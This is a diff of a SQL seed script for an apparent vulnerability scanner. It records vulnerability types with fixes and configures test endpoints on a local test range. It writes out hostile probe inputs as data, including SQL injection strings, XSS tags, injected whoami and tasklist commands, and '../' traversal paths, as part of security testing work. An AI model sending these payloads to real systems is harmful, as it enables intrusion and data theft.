+ '评论提交接口存在存储型XSS漏洞，攻击者可注入iframe标签嵌入恶意页面',
+ '对用户输入进行HTML实体转义，设置CSP策略');
 
-('命令注入漏洞 - 文件下载', 'COMMAND_INJECTION', 'CRITICAL', '/api/download', 0, 
- '文件下载功能存在命令注入漏洞，攻击者可执行任意系统命令',
- '避免直接调用系统命令；使用白名单验证文件名；使用安全的文件操作 API'),
+-- XSS反射型漏洞（5个漏洞，对应规则ID 10,11,12,15,16）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('XSS反射型-script标签注入', 'XSS', 'HIGH', '/target/xss/search', 0, '10', 1, 2,
+ '搜索接口存在反射型XSS漏洞，攻击者可注入script标签执行恶意脚本',
+ '对用户输入进行HTML实体转义，设置Content-Type响应头'),
+('XSS反射型-javascript协议注入', 'XSS', 'HIGH', '/target/xss/search', 0, '11', 1, 2,
+ '搜索接口存在反射型XSS漏洞，攻击者可使用javascript:协议执行代码',
+ '对用户输入进行HTML实体转义，设置Content-Type响应头'),
+('XSS反射型-onerror事件注入', 'XSS', 'MEDIUM', '/target/xss/search', 0, '12', 1, 2,
+ '搜索接口存在反射型XSS漏洞，攻击者可使用onerror事件执行脚本',
+ '对用户输入进行HTML实体转义，设置Content-Type响应头'),
+('XSS反射型-alert函数注入', 'XSS', 'MEDIUM', '/target/xss/search', 0, '15', 1, 2,
+ '搜索接口存在反射型XSS漏洞，攻击者可注入alert函数测试漏洞',
+ '对用户输入进行HTML实体转义，设置Content-Type响应头'),
+('XSS反射型-document对象注入', 'XSS', 'HIGH', '/target/xss/search', 0, '16', 1, 2,
+ '搜索接口存在反射型XSS漏洞，攻击者可访问document对象窃取信息',
+ '对用户输入进行HTML实体转义，设置Content-Type响应头');
 
-('路径遍历漏洞 - 文件读取', 'PATH_TRAVERSAL', 'HIGH', '/api/file/read', 0, 
- '文件读取功能存在路径遍历漏洞，攻击者可读取任意文件',
- '限制文件访问目录；对文件路径进行规范化处理；使用白名单验证文件名'),
+-- XSS DOM型漏洞（5个漏洞，对应规则ID 10,11,12,13,18）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('XSS DOM型-script标签注入', 'XSS', 'HIGH', '/target/xss/profile', 0, '10', 1, 2,
+ '用户资料接口存在DOM型XSS漏洞，攻击者可注入script标签执行恶意脚本',
+ '前端使用安全的DOM操作方法，避免innerHTML直接插入'),
+('XSS DOM型-javascript协议注入', 'XSS', 'HIGH', '/target/xss/profile', 0, '11', 1, 2,
+ '用户资料接口存在DOM型XSS漏洞，攻击者可使用javascript:协议执行代码',
+ '前端使用安全的DOM操作方法，避免innerHTML直接插入'),
+('XSS DOM型-onerror事件注入', 'XSS', 'MEDIUM', '/target/xss/profile', 0, '12', 1, 2,
+ '用户资料接口存在DOM型XSS漏洞，攻击者可使用onerror事件执行脚本',
+ '前端使用安全的DOM操作方法，避免innerHTML直接插入'),
+('XSS DOM型-onload事件注入', 'XSS', 'MEDIUM', '/target/xss/profile', 0, '13', 1, 2,
+ '用户资料接口存在DOM型XSS漏洞，攻击者可使用onload事件执行脚本',
+ '前端使用安全的DOM操作方法，避免innerHTML直接插入'),
+('XSS DOM型-SVG标签注入', 'XSS', 'MEDIUM', '/target/xss/profile', 0, '18', 1, 2,
+ '用户资料接口存在DOM型XSS漏洞，攻击者可注入SVG标签执行脚本',
+ '前端使用安全的DOM操作方法，避免innerHTML直接插入');
 
-('文件包含漏洞 - 远程文件', 'FILE_INCLUSION', 'CRITICAL', '/api/template/load', 0, 
- '模板加载功能存在文件包含漏洞，攻击者可包含远程恶意文件',
- '禁用 allow_url_include；使用白名单验证文件名；避免用户输入直接影响文件路径'),
+-- 命令注入漏洞（9个漏洞，对应规则ID 21-29）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('命令注入-管道符攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '21', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可使用管道符|执行任意命令',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-分号攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '22', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可使用分号;执行多条命令',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-反引号攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '23', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可使用反引号`执行命令替换',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-$()执行攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '24', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可使用$()执行命令替换',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-Windows cmd攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '25', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可调用Windows cmd执行命令',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-ping命令攻击', 'COMMAND_INJECTION', 'MEDIUM', '/target/cmd/execute', 0, '26', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可执行ping命令探测网络',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-whoami命令攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '27', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可执行whoami获取当前用户',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-tasklist命令攻击', 'COMMAND_INJECTION', 'MEDIUM', '/target/cmd/execute', 0, '28', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可执行tasklist获取进程列表',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令'),
+('命令注入-cat命令攻击', 'COMMAND_INJECTION', 'HIGH', '/target/cmd/execute', 0, '29', 1, 2,
+ '命令执行接口存在命令注入漏洞，攻击者可执行cat读取敏感文件',
+ '对接口建立命令白名单，禁止将用户输入直接传入系统命令');
 
-('未授权访问 - 管理接口', 'UNAUTHORIZED_ACCESS', 'HIGH', '/admin/*', 0, 
- '管理接口未进行身份验证，攻击者可直接访问敏感功能',
- '添加身份验证中间件；实施基于角色的访问控制；对敏感操作进行二次验证'),
+-- 路径遍历漏洞（6个漏洞，对应规则ID 30-35）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('路径遍历-父目录引用攻击', 'PATH_TRAVERSAL', 'HIGH', '/target/path/read', 0, '30', 1, 2,
+ '文件读取接口存在路径遍历漏洞，攻击者可使用../读取任意文件',
+ '限制文件访问目录，规范化路径处理，使用白名单验证'),
+('路径遍历-Linux敏感文件攻击', 'PATH_TRAVERSAL', 'CRITICAL', '/target/path/read', 0, '31', 1, 2,
+ '文件读取接口存在路径遍历漏洞，攻击者可读取/etc/passwd等敏感文件',
+ '限制文件访问目录，规范化路径处理，使用白名单验证'),
+('路径遍历-Windows敏感路径攻击', 'PATH_TRAVERSAL', 'HIGH', '/target/path/read', 0, '32', 1, 2,
+ '文件读取接口存在路径遍历漏洞，攻击者可读取Windows系统文件',
+ '限制文件访问目录，规范化路径处理，使用白名单验证'),
+('路径遍历-URL编码绕过攻击', 'PATH_TRAVERSAL', 'HIGH', '/target/path/read', 0, '33', 1, 2,
+ '文件读取接口存在路径遍历漏洞，攻击者可使用URL编码绕过过滤',
+ '限制文件访问目录，规范化路径处理，使用白名单验证'),
+('路径遍历-双重编码绕过攻击', 'PATH_TRAVERSAL', 'HIGH', '/target/path/read', 0, '34', 1, 2,
+ '文件读取接口存在路径遍历漏洞，攻击者可使用双重URL编码绕过',
+ '限制文件访问目录，规范化路径处理，使用白名单验证'),
+('路径遍历-配置文件访问攻击', 'PATH_TRAVERSAL', 'HIGH', '/target/path/read', 0, '35', 1, 2,
+ '文件读取接口存在路径遍历漏洞，攻击者可读取application.yml等配置文件',
+ '限制文件访问目录，规范化路径处理，使用白名单验证');
 
-('信息泄露 - 错误详情', 'INFORMATION_DISCLOSURE', 'LOW', '/api/*', 0, 
- 'API 接口返回详细错误信息，可能泄露系统敏感信息',
- '使用统一的错误处理机制；不返回详细堆栈信息；记录错误日志到服务器'),
+-- 文件包含漏洞（5个漏洞，对应规则ID 36-40）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('文件包含-PHP函数攻击', 'FILE_INCLUSION', 'HIGH', '/target/file/include', 0, '36', 1, 2,
+ '文件加载接口存在文件包含漏洞，攻击者可使用PHP包含函数加载任意文件',
+ '限制接口仅加载预定义资源，并校验文件类型与资源根目录'),
+('文件包含-data协议攻击', 'FILE_INCLUSION', 'HIGH', '/target/file/include', 0, '37', 1, 2,
+ '文件加载接口存在文件包含漏洞，攻击者可使用data协议注入代码',
+ '限制接口仅加载预定义资源，并校验文件类型与资源根目录'),
+('文件包含-php协议攻击', 'FILE_INCLUSION', 'HIGH', '/target/file/include', 0, '38', 1, 2,
+ '文件加载接口存在文件包含漏洞，攻击者可使用php://协议读取文件',
+ '限制接口仅加载预定义资源，并校验文件类型与资源根目录'),
+('文件包含-file协议攻击', 'FILE_INCLUSION', 'HIGH', '/target/file/include', 0, '39', 1, 2,
+ '文件加载接口存在文件包含漏洞，攻击者可使用file://协议读取本地文件',
+ '限制接口仅加载预定义资源，并校验文件类型与资源根目录'),
+('文件包含-classpath协议攻击', 'FILE_INCLUSION', 'HIGH', '/target/file/include', 0, '40', 1, 2,
+ '文件加载接口存在文件包含漏洞，攻击者可使用classpath:协议加载资源',
+ '限制接口仅加载预定义资源，并校验文件类型与资源根目录');
 
-('SSRF 漏洞 - 内网探测', 'SSRF', 'HIGH', '/api/fetch', 0, 
- 'URL 抓取功能存在 SSRF 漏洞，攻击者可探测内网服务',
- '限制协议类型（仅允许 HTTP/HTTPS）；禁用重定向；使用白名单验证目标地址');
+-- SSRF漏洞（6个漏洞，对应规则ID 41-46）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('SSRF-内网IP访问攻击', 'SSRF', 'HIGH', '/target/ssrf/request', 0, '41', 1, 2,
+ 'URL请求接口存在SSRF漏洞，攻击者可访问内网IP探测内部服务',
+ '限制协议类型，禁用重定向，使用白名单验证目标地址'),
+('SSRF-file协议攻击', 'SSRF', 'HIGH', '/target/ssrf/request', 0, '42', 1, 2,
+ 'URL请求接口存在SSRF漏洞，攻击者可使用file://协议读取本地文件',
+ '限制协议类型，禁用重定向，使用白名单验证目标地址'),
+('SSRF-dict协议攻击', 'SSRF', 'HIGH', '/target/ssrf/request', 0, '43', 1, 2,
+ 'URL请求接口存在SSRF漏洞，攻击者可使用dict://协议探测端口',
+ '限制协议类型，禁用重定向，使用白名单验证目标地址'),
+('SSRF-gopher协议攻击', 'SSRF', 'HIGH', '/target/ssrf/request', 0, '44', 1, 2,
+ 'URL请求接口存在SSRF漏洞，攻击者可使用gopher://协议发送任意请求',
+ '限制协议类型，禁用重定向，使用白名单验证目标地址'),
+('SSRF-云元数据攻击', 'SSRF', 'HIGH', '/target/ssrf/request', 0, '45', 1, 2,
+ 'URL请求接口存在SSRF漏洞，攻击者可访问云元数据服务获取敏感信息',
+ '限制协议类型，禁用重定向，使用白名单验证目标地址'),
+('SSRF-本地回环攻击', 'SSRF', 'HIGH', '/target/ssrf/request', 0, '46', 1, 2,
+ 'URL请求接口存在SSRF漏洞，攻击者可访问localhost绕过防火墙',
+ '限制协议类型，禁用重定向，使用白名单验证目标地址');
+
+-- XXE漏洞（6个漏洞，对应规则ID 47-52）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('XXE-DOCTYPE ENTITY攻击', 'XXE', 'HIGH', '/target/xxe/parse', 0, '47', 1, 2,
+ 'XML解析接口存在XXE漏洞，攻击者可声明外部实体读取文件',
+ '禁用DTD和外部实体解析，使用安全的XML解析配置'),
+('XXE-SYSTEM关键字攻击', 'XXE', 'HIGH', '/target/xxe/parse', 0, '48', 1, 2,
+ 'XML解析接口存在XXE漏洞，攻击者可使用SYSTEM关键字加载外部资源',
+ '禁用DTD和外部实体解析，使用安全的XML解析配置'),
+('XXE-PUBLIC关键字攻击', 'XXE', 'HIGH', '/target/xxe/parse', 0, '49', 1, 2,
+ 'XML解析接口存在XXE漏洞，攻击者可使用PUBLIC关键字加载外部资源',
+ '禁用DTD和外部实体解析，使用安全的XML解析配置'),
+('XXE-file协议攻击', 'XXE', 'HIGH', '/target/xxe/parse', 0, '50', 1, 2,
+ 'XML解析接口存在XXE漏洞，攻击者可使用file://协议读取本地文件',
+ '禁用DTD和外部实体解析，使用安全的XML解析配置'),
+('XXE-http协议攻击', 'XXE', 'HIGH', '/target/xxe/parse', 0, '51', 1, 2,
+ 'XML解析接口存在XXE漏洞，攻击者可使用http://协议发起SSRF攻击',
+ '禁用DTD和外部实体解析，使用安全的XML解析配置'),
+('XXE-参数实体攻击', 'XXE', 'HIGH', '/target/xxe/parse', 0, '52', 1, 2,
+ 'XML解析接口存在XXE漏洞，攻击者可使用参数实体绕过过滤',
+ '禁用DTD和外部实体解析，使用安全的XML解析配置');
+
+-- 反序列化漏洞（4个漏洞，对应规则ID 53-56）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('反序列化-Java序列化对象攻击', 'DESERIALIZATION', 'HIGH', '/target/deserial/parse', 0, '53', 1, 2,
+ '反序列化接口存在漏洞，攻击者可注入恶意Java序列化对象执行代码',
+ '使用类白名单校验，避免反序列化不可信数据'),
+('反序列化-PHP序列化攻击', 'DESERIALIZATION', 'HIGH', '/target/deserial/parse', 0, '54', 1, 2,
+ '反序列化接口存在漏洞，攻击者可注入PHP序列化字符串执行代码',
+ '使用类白名单校验，避免反序列化不可信数据'),
+('反序列化-Python pickle攻击', 'DESERIALIZATION', 'HIGH', '/target/deserial/parse', 0, '55', 1, 2,
+ '反序列化接口存在漏洞，攻击者可注入Python pickle对象执行代码',
+ '使用类白名单校验，避免反序列化不可信数据'),
+('反序列化-Base64编码Java攻击', 'DESERIALIZATION', 'HIGH', '/target/deserial/parse', 0, '56', 1, 2,
+ '反序列化接口存在漏洞，攻击者可注入Base64编码的Java序列化对象',
+ '使用类白名单校验，避免反序列化不可信数据');
+
+-- CSRF漏洞（3个漏洞，对应规则ID 57-59）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('CSRF-表单自动提交攻击', 'CSRF', 'MEDIUM', '/target/csrf/update-name', 0, '57', 1, 2,
+ '昵称修改接口存在CSRF漏洞，攻击者可构造自动提交表单发起攻击',
+ '为接口启用CSRF Token校验，并校验请求来源'),
+('CSRF-隐藏字段攻击', 'CSRF', 'LOW', '/target/csrf/update-name', 0, '58', 1, 2,
+ '昵称修改接口存在CSRF漏洞，攻击者可使用隐藏字段构造攻击页面',
+ '为接口启用CSRF Token校验，并校验请求来源'),
+('CSRF-跨域请求攻击', 'CSRF', 'LOW', '/target/csrf/update-name', 0, '59', 1, 2,
+ '昵称修改接口存在CSRF漏洞，攻击者可构造跨域请求发起攻击',
+ '为接口启用CSRF Token校验，并校验请求来源');
+
+-- DDoS漏洞（3个漏洞，对应规则ID 60）
+INSERT INTO `sys_vulnerability_monitor` (`vuln_name`, `vuln_type`, `vuln_level`, `vuln_path`, `verify_status`, `rule_ids`, `rule_count`, `defense_status`, `description`, `fix_suggestion`) VALUES
+('DDoS-CPU密集型攻击', 'DDOS', 'HIGH', '/target/ddos/compute-heavy', 0, '60', 1, 2,
+ 'CPU密集型计算接口易受DDoS攻击，高频请求可耗尽服务器资源',
+ '添加请求频率限制，使用CDN防护，配置资源监控告警'),
+('DDoS-I/O延迟型攻击', 'DDOS', 'MEDIUM', '/target/ddos/io-delay', 0, '60', 1, 2,
+ 'I/O延迟接口易受慢速攻击，可长期占用连接资源',
+ '设置连接超时时间，限制并发连接数，使用连接池管理'),
+('DDoS-Ping洪水攻击', 'DDOS', 'MEDIUM', '/target/ddos/ping', 0, '60', 1, 2,
+ '简单Ping接口易受高频洪水攻击，可冲击网络栈',
+ '添加请求频率限制，使用负载均衡，配置防火墙规则');
+
+-- ------------------------------------------------------------
+-- 4.2.1 初始化漏洞-规则关联关系（一对一）
+-- ------------------------------------------------------------
+INSERT INTO `sys_vulnerability_rule` (`vulnerability_id`, `rule_id`, `rule_name`, `attack_type`, `risk_level`)
+SELECT v.id, v.rule_ids, 
+       (SELECT r.rule_name FROM sys_monitor_rule r WHERE r.id = CAST(v.rule_ids AS UNSIGNED)),
+       v.vuln_type,
+       v.vuln_level
+FROM sys_vulnerability_monitor v
+WHERE v.rule_ids IS NOT NULL;
 
 -- ------------------------------------------------------------
 -- 4.3 初始化扫描配置数据
 -- ------------------------------------------------------------
 
 -- 初始化扫描目标（靶场服务）
-INSERT INTO `sys_scan_target` (`target_name`, `target_url`, `target_type`, `description`, `enabled`) VALUES
-('靶场服务', 'http://127.0.0.1:9001', 'TEST', '漏洞测试靶场服务，包含SQL注入、XSS、命令注入等多种漏洞测试接口', 1);
+INSERT INTO `sys_scan_target` (`id`, `target_name`, `target_url`, `target_type`, `description`, `enabled`) VALUES
+(1, '靶场服务', 'http://127.0.0.1:9001', 'TEST', '漏洞测试靶场服务，包含SQL注入、XSS、命令注入等多种漏洞测试接口', 1);
 
 -- 初始化扫描接口配置（靶场服务的各个漏洞测试接口）
-INSERT INTO `sys_scan_interface` (`target_id`, `interface_name`, `interface_path`, `http_method`, `vuln_type`, `risk_level`, `params_config`, `payload_config`, `match_rules`, `enabled`, `priority`, `defense_rule_status`, `defense_rule_count`, `defense_rule_note`) VALUES
+INSERT INTO `sys_scan_interface` (`target_id`, `interface_name`, `interface_path`, `http_method`, `vuln_type`, `risk_level`, `params_config`, `payload_config`, `match_rules`, `enabled`, `priority`, `defense_rule_status`, `defense_rule_count`, `defense_rule_note`, `business_type`, `input_params`, `output_type`, `auth_required`, `content_type`, `external_request`, `file_operation`, `db_operation`, `inferred_vuln_types`, `scan_status`) VALUES
 (1, 'SQL注入测试接口', '/target/sql/query', 'GET', 'SQL_INJECTION', 'HIGH', 
- '{"id": {"type": "string", "required": true, "testValues": ["1", "1 OR 1=1", "1; SELECT 1"]}}',
+ '{"id": {"type": "string", "required": true, "testValues": ["1", "1 OR 1=1", "1; SELECT 1", "1 UNION SELECT 1,2,3,4,5"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["OR 1=1", "statement_results", "executed_sql"], "responsePatterns": ["SQL注入漏洞", "多语句执行成功"]}',
- 1, 10, 0, 0, NULL),
+ '{"keywords": ["OR 1=1", "statement_results", "executed_sql", "SQL注入漏洞"], "responsePatterns": ["SQL注入漏洞", "多语句执行成功"]}',
+ 1, 10, 2, 9, '已关联9条SQL注入检测规则', 'DATA_QUERY', '[{"name":"id","type":"string","source":"query","required":true}]', 'JSON', 0, 'application/json', 0, 0, 1, '["SQL_INJECTION"]', 'PENDING'),
+
+(1, 'XSS存储型测试接口', '/target/xss/submit-comment', 'POST', 'XSS', 'HIGH',
+ '{"content": {"type": "string", "required": true, "testValues": ["test", "<script>alert(1)</script>"]}}',
+ '{"payloadLevel": "BASIC", "customPayloads": []}',
+ '{"keywords": ["存储型XSS漏洞", "评论提交成功"], "responsePatterns": ["存储型XSS漏洞", "评论提交成功"]}',
+ 1, 15, 2, 11, '已关联11条XSS检测规则', 'DATA_SUBMIT', '[{"name":"content","type":"string","source":"body","required":true}]', 'JSON', 0, 'application/x-www-form-urlencoded', 0, 0, 1, '["XSS"]', 'PENDING'),
 
 (1, 'XSS反射型测试接口', '/target/xss/search', 'GET', 'XSS', 'MEDIUM',
  '{"keyword": {"type": "string", "required": true, "testValues": ["test", "<script>alert(1)</script>"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["scan_xss_quick", "scan_xss_full"], "responsePatterns": ["反射型XSS漏洞", "搜索成功"]}',
- 1, 20, 0, 0, NULL),
+ '{"keywords": ["反射型XSS漏洞", "搜索成功"], "responsePatterns": ["反射型XSS漏洞", "搜索成功"]}',
+ 1, 20, 2, 5, '已关联5条XSS检测规则', 'USER_INPUT', '[{"name":"keyword","type":"string","source":"query","required":true}]', 'HTML', 0, 'application/json', 0, 0, 0, '["XSS"]', 'PENDING'),
 
 (1, 'XSS DOM型测试接口', '/target/xss/profile', 'GET', 'XSS', 'MEDIUM',
  '{"username": {"type": "string", "required": true, "testValues": ["test", "<svg/onload=alert(1)>"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["scan_xss_quick", "scan_xss_full"], "responsePatterns": ["DOM型XSS漏洞", "获取资料成功"]}',
- 1, 30, 0, 0, NULL),
+ '{"keywords": ["DOM型XSS漏洞", "获取资料成功"], "responsePatterns": ["DOM型XSS漏洞", "获取资料成功"]}',
+ 1, 25, 2, 5, '已关联5条XSS检测规则', 'USER_INPUT', '[{"name":"username","type":"string","source":"query","required":true}]', 'HTML', 0, 'application/json', 0, 0, 0, '["XSS"]', 'PENDING'),
 
 (1, '命令注入测试接口', '/target/cmd/execute', 'GET', 'COMMAND_INJECTION', 'CRITICAL',
- '{"cmd": {"type": "string", "required": true, "testValues": ["ping 127.0.0.1 -n 2", "whoami"]}}',
+ '{"cmd": {"type": "string", "required": true, "testValues": ["ping 127.0.0.1 -n 2", "whoami", "tasklist"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["Pinging", "ping statistics", "\\\\", "root"], "responsePatterns": ["命令执行结果", "纯命令注入漏洞触发成功"]}',
- 1, 5, 0, 0, NULL),
+ '{"keywords": ["Pinging", "ping statistics", "\\\\", "root", "命令执行结果"], "responsePatterns": ["命令执行结果", "纯命令注入漏洞触发成功"]}',
+ 1, 5, 2, 9, '已关联9条命令注入检测规则', 'COMMAND_EXEC', '[{"name":"cmd","type":"string","source":"query","required":true}]', 'JSON', 0, 'application/json', 0, 0, 0, '["COMMAND_INJECTION"]', 'PENDING'),
 
 (1, '路径遍历测试接口', '/target/path/read', 'GET', 'PATH_TRAVERSAL', 'HIGH',
- '{"filename": {"type": "string", "required": true, "testValues": ["test.txt", "../../application.yml"]}}',
+ '{"filename": {"type": "string", "required": true, "testValues": ["test.txt", "../../application.yml", "../../../pom.xml"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["server:", "<project", "root:"], "responsePatterns": ["路径遍历漏洞", "文件读取成功"]}',
- 1, 15, 0, 0, NULL),
+ '{"keywords": ["server:", "<project", "root:", "路径遍历漏洞"], "responsePatterns": ["路径遍历漏洞", "文件读取成功"]}',
+ 1, 30, 2, 6, '已关联6条路径遍历检测规则', 'FILE_OPERATION', '[{"name":"filename","type":"string","source":"query","required":true}]', 'FILE', 0, 'application/json', 0, 1, 0, '["PATH_TRAVERSAL","FILE_INCLUSION"]', 'PENDING'),
 
 (1, '文件包含测试接口', '/target/file/include', 'GET', 'FILE_INCLUSION', 'HIGH',
- '{"path": {"type": "string", "required": true, "testValues": ["test.properties", "config/test.properties"]}}',
+ '{"path": {"type": "string", "required": true, "testValues": ["test.txt", "config/test.properties", "classpath:application.yml"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["db.password", "文件包含漏洞", "文件加载成功"], "responsePatterns": ["文件包含漏洞", "文件加载成功"]}',
- 1, 25, 0, 0, NULL),
+ '{"keywords": ["文件包含漏洞", "文件加载成功", "parsed_content"], "responsePatterns": ["文件包含漏洞", "文件加载成功"]}',
+ 1, 35, 2, 5, '已关联5条文件包含检测规则', 'FILE_OPERATION', '[{"name":"path","type":"string","source":"query","required":true}]', 'JSON', 0, 'application/json', 0, 1, 0, '["FILE_INCLUSION","PATH_TRAVERSAL"]', 'PENDING'),
 
 (1, 'SSRF测试接口', '/target/ssrf/request', 'GET', 'SSRF', 'HIGH',
- '{"url": {"type": "string", "required": true, "testValues": ["http://127.0.0.1:9001/target/ddos/status"]}}',
+ '{"url": {"type": "string", "required": true, "testValues": ["http://127.0.0.1:9001/target/ddos/status", "http://localhost:9001/target/sql/query?id=1"]}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
  '{"keywords": ["DDoS被攻击目标状态", "SSRF漏洞", "请求成功"], "responsePatterns": ["SSRF漏洞", "请求成功（漏洞接口）"]}',
- 1, 35, 0, 0, NULL),
+ 1, 40, 2, 6, '已关联6条SSRF检测规则', 'URL_FETCH', '[{"name":"url","type":"string","source":"query","required":true}]', 'JSON', 0, 'application/json', 1, 0, 0, '["SSRF"]', 'PENDING'),
 
 (1, 'XXE测试接口', '/target/xxe/parse', 'POST', 'XXE', 'HIGH',
  '{"xmlBody": {"type": "xml", "required": true}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
- '{"keywords": ["has_external_entity", "test_password_123", "XXE漏洞"], "responsePatterns": ["XXE漏洞", "has_external_entity"]}',
- 1, 40, 0, 0, NULL),
+ '{"keywords": ["has_external_entity", "XXE漏洞", "XML解析成功"], "responsePatterns": ["XXE漏洞", "has_external_entity"]}',
+ 1, 45, 2, 6, '已关联6条XXE检测规则', 'XML_PROCESS', '[{"name":"xmlBody","type":"xml","source":"body","required":true}]', 'JSON', 0, 'application/xml', 0, 0, 0, '["XXE"]', 'PENDING'),
+
+(1, '反序列化测试接口', '/target/deserial/parse', 'POST', 'DESERIALIZATION', 'CRITICAL',
+ '{"serializedData": {"type": "string", "required": true}}',
+ '{"payloadLevel": "BASIC", "customPayloads": []}',
+ '{"keywords": ["反序列化漏洞", "deserialized_object", "反序列化成功"], "responsePatterns": ["反序列化漏洞", "反序列化成功"]}',
+ 1, 50, 2, 4, '已关联4条反序列化检测规则', 'USER_INPUT', '[{"name":"serializedData","type":"string","source":"body","required":true}]', 'JSON', 0, 'application/json', 0, 0, 0, '["DESERIALIZATION"]', 'PENDING'),
 
 (1, 'CSRF测试接口', '/target/csrf/update-name', 'POST', 'CSRF', 'MEDIUM',
  '{"userId": {"type": "string", "required": true}, "nickname": {"type": "string", "required": true}}',
  '{"payloadLevel": "BASIC", "customPayloads": []}',
  '{"keywords": ["CSRF漏洞", "昵称修改成功"], "responsePatterns": ["CSRF漏洞", "昵称修改成功（漏洞接口）"]}',
- 1, 45, 0, 0, NULL);
+ 1, 55, 2, 3, '已关联3条CSRF检测规则', 'DATA_SUBMIT', '[{"name":"userId","type":"string","source":"body","required":true},{"name":"nickname","type":"string","source":"body","required":true}]', 'JSON', 0, 'application/x-www-form-urlencoded', 0, 0, 1, '["CSRF","XSS"]', 'PENDING'),
+
+(1, 'DDoS CPU密集型接口', '/target/ddos/compute-heavy', 'GET', 'DDOS', 'HIGH',
+ '{}',
+ '{"payloadLevel": "BASIC", "customPayloads": []}',
+ '{"keywords": ["CPU密集型计算完成", "fibonacci"], "responsePatterns": ["CPU密集型计算完成"]}',
+ 1, 60, 2, 1, '已关联1条DDoS检测规则', 'USER_INPUT', '[]', 'JSON', 0, 'application/json', 0, 0, 0, '["DDOS"]', 'PENDING'),
+
+(1, 'DDoS I/O延迟接口', '/target/ddos/io-delay', 'GET', 'DDOS', 'MEDIUM',
+ '{"delay": {"type": "int", "required": false, "testValues": [1000, 5000]}}',
+ '{"payloadLevel": "BASIC", "customPayloads": []}',
+ '{"keywords": ["I/O操作模拟完成", "simulated_delay_ms"], "responsePatterns": ["I/O操作模拟完成"]}',
+ 1, 65, 2, 1, '已关联1条DDoS检测规则', 'USER_INPUT', '[{"name":"delay","type":"int","source":"query","required":false}]', 'JSON', 0, 'application/json', 0, 0, 0, '["DDOS"]', 'PENDING'),
+
+(1, 'DDoS Ping接口', '/target/ddos/ping', 'GET', 'DDOS', 'MEDIUM',
+ '{}',
+ '{"payloadLevel": "BASIC", "customPayloads": []}',
+ '{"keywords": ["pong", "total_requests"], "responsePatterns": ["pong"]}',
+ 1, 70, 2, 1, '已关联1条DDoS检测规则', 'USER_INPUT', '[]', 'JSON', 0, 'application/json', 0, 0, 0, '["DDOS"]', 'PENDING');
 
 -- 初始化Payload库（基础Payload）
 INSERT INTO `sys_payload_library` (`vuln_type`, `payload_level`, `payload_content`, `match_keywords`, `description`, `risk_level`, `enabled`) VALUES
 -- SQL注入Payload
 ('SQL_INJECTION', 'BASIC', '1 OR 1=1', 'OR 1=1', '布尔型恒真注入探测', 'HIGH', 1),
